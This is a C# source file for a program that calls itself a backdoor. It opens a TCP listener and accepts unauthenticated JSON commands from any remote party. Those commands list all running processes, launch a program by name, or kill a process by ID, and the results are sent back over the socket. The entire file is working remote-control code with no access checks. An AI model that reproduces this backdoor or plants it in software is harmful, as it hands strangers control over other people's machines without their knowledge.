namespace RemoteController.Client;

public static class Program
{
    public static TcpListener Client { get; set; }


    static Program()
    {
        var address = IPAddress.Parse(ConfigurationManager.AppSettings["IpAddress"]);
        var port = int.Parse(ConfigurationManager.AppSettings["PortNumber"]);

        Client = new TcpListener(address, port);
    }


    private static void Main(string[] args)
    {
        Console.ForegroundColor = ConsoleColor.DarkGreen;

        try
        {
            Client.Start();
        }
        catch
        {
            Console.WriteLine(string.Format("[{0}] - {1}: Failed to start backdoor!", DateTime.Now, Client.Server.LocalEndPoint)); return;
        }

        Console.WriteLine(string.Format("[{0}] - {1}: Backdoor started successfully!", DateTime.Now, Client.Server.LocalEndPoint));

        while (true)
        {
            var client = Client.AcceptTcpClient();
            Console.WriteLine(string.Format("[{0}] - {1}: Server connected!", DateTime.Now, client.Client.RemoteEndPoint));

            Task.Factory.StartNew(() => CommunicationWithClient(client));
        }
    }

    private static void CommunicationWithClient(TcpClient client)
    {
        var networkStream = client.GetStream();

        string jsonString = string.Empty;
        byte[]? bytes = null;
        int length = default;

        while (true)
        {
            if (networkStream.DataAvailable)
            {
                bytes = new byte[1024];
                length = networkStream.Read(bytes, 0, bytes.Length);
                jsonString = Encoding.Default.GetString(bytes, 0, length);

                if (jsonString.Contains("DisConnected"))
                {
                    Console.WriteLine(string.Format("[{0}] - {1}: Server DisConnected!", DateTime.Now, client.Client.RemoteEndPoint)); return;
                }

                var command = JsonSerializer.Deserialize<NetCommand>(jsonString);

                if (command.Title.Contains("List"))
                {
                    var systemProcesses = Process.GetProcesses();
                    var customProcesses = new List<CustomProcess>();

                    foreach (var process in systemProcesses)
                        customProcesses.Add(new CustomProcess(process));

                    jsonString = JsonSerializer.Serialize(customProcesses);
                    bytes = Encoding.Default.GetBytes(jsonString);
                    networkStream.Write(bytes, 0, bytes.Length);
                }
                else if (command.Title.Contains("Create"))
                {
                    var processName = JsonSerializer.Deserialize<string>(command.Content);

                    try
                    {
                        Process.Start(processName);
                        bytes = Encoding.Default.GetBytes("Process succesfully created!");
                    }
                    catch
                    {
                        bytes = Encoding.Default.GetBytes("Process with this name does not exist!");
                    }

                    networkStream.Write(bytes, 0, bytes.Length);
                }
                else if (command.Title.Contains("Kill"))
                {
                    var processId = JsonSerializer.Deserialize<int>(command.Content);

                    try
                    {
                        var process = Process.GetProcessById(processId);

                        process.Kill();
                        process.Close();

                        bytes = Encoding.Default.GetBytes("Process succesfully closed!");
                    }
                    catch (Exception ex)
                    {
                        bytes = Encoding.Default.GetBytes(ex.Message);
                    }

                    networkStream.Write(bytes, 0, bytes.Length);
                }
            }
        }
    }
}
